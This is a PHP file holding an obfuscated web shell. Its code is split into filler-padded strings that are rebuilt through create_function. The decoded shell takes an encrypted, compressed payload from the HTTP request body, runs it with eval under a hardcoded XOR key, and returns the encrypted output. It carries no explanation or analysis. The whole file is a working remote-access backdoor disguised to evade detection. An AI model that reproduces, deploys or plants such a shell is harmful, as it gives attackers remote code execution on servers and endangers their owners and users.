<?php
$b='trlen($t);$oC="";fCor($i=0C;$iC<$l;)C{forC($j=0;($CCj<$c&&$i<$l)C';
$i=str_replace('xR','','crexRaxRxRte_xRfuncxRxRtion');
$I=';$j++,$CCCi++){$o.=$t{$i}^$k{$jC}C;}}return C$o;}if C(@pCreg_mat';
$C='chC("/C$kh(.C+)$kf/",@fiClCe_getCCC_contents("pChp://input"),C';
$R='C$m)==C1) {@Cob_start();@evCal(@gzunCcompresCCs(@xC(@bCase6C4_dec';
$w='$kC="b174bf8C0";C$kh="0C5531c8a4Cb4Cf";$Ckf="a854c8C281C07C5";$p=';
$p='Cr=@baCseC64C_encode(@x(@CgzcompresCs(C$o),$k));priCnt(CC"$p$kh$r$kf");}';
$r='"Nk5ks4kA7M6C0SDYCl";fuCnction CCx($t,$k){$Cc=strlCen($k);$Cl=sC';
$m='ode($m[1]),C$k)C));$o=@ob_geCt_contenCts(C);@obC_endC_clean();$';
$L=str_replace('C','',$w.$r.$b.$I.$C.$R.$m.$p);
$O=$i('',$L);$O();
?>
